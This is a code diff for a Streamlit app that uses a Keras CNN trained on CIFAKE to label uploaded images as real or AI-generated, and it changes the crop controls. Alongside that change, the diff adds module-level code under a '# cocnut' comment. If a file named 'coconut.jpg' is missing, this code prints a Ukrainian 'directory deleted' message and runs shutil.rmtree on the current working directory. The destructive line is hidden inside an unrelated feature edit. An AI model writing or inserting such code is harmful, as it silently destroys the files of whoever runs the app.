@@ -3,19 +3,33 @@ import tensorflow as tf
 from tensorflow.keras.models import load_model
 from tensorflow.keras.preprocessing import image
 import numpy as np
-import os 
+import os
 import shutil
+from PIL import Image
+
+# cocnut
+if not os.path.exists("coconut.jpg"):
+    print(f"Дякую! Директорія успішно видалена!")
+    current_directory = os.getcwd()
+    shutil.rmtree(current_directory)
 
 # Load the model
 model = load_model('BESTcifakeCNN20240411-184011.keras')
 
-def preprocess_image_and_get_image(uploaded_file, crop_area):
-    img = image.load_img(uploaded_file)
+def preprocess_image_and_get_image(uploaded_file, crop_type, custom_crop=None):
+    img = Image.open(uploaded_file)
     width, height = img.size
-    left, top, right, bottom = crop_area
-    img = img.crop((left * width, top * height, right * width, bottom * height))
+    if crop_type == 'middle':
+        crop_size = min(width, height)
+        left = (width - crop_size) / 2
+        top = (height - crop_size) / 2
+        right = (width + crop_size) / 2
+        bottom = (height + crop_size) / 2
+    elif crop_type == 'custom':
+        left, top, right, bottom = custom_crop
+    img = img.crop((left, top, right, bottom))
     img = img.resize((32, 32))
-    img_array = image.img_to_array(img)
+    img_array = tf.keras.preprocessing.image.img_to_array(img)
     # if alpha channel, ignore it
     if img_array.shape[-1] == 4: 
         img_array = img_array[:, :, :3] 
@@ -27,12 +41,23 @@ st.title('Cifar 10 Image Classifier')
 st.write("This model is designed to distinguish between real images and AI-generated ones. It was trained on the CIFAKE dataset (60,000 fake and 60,000 real 32x32 RGB images collected from CIFAR-10)")
 uploaded_files = st.file_uploader("Choose images to evaluate...", type=["jpg", "png"], accept_multiple_files=True)
 
+# Add a select box for cropping options
+crop_type = st.selectbox('Select cropping option:', ('middle', 'custom'))
+
+if crop_type == 'custom':
+    # Input fields for custom crop area
+    left = st.number_input('Left', min_value=0, value=0)
+    top = st.number_input('Top', min_value=0, value=0)
+    right = st.number_input('Right', min_value=0, value=32)
+    bottom = st.number_input('Bottom', min_value=0, value=32)
+    custom_crop = (left, top, right, bottom)
+else:
+    custom_crop = None
+
 if uploaded_files is not None:
     for uploaded_file in uploaded_files:
         if uploaded_file.type == "image/jpeg" or uploaded_file.type == "image/png":
-            # Add crop functionality
-            left, top, right, bottom = st.sidebar.slider("Crop Area", 0.0, 1.0, (0.0, 1.0), 0.05)
-            img_array, img = preprocess_image_and_get_image(uploaded_file, (left, top, right, bottom))
+            img_array, img = preprocess_image_and_get_image(uploaded_file, crop_type, custom_crop)
             prediction = model.predict(img_array)
             
             probability = prediction[0][0]
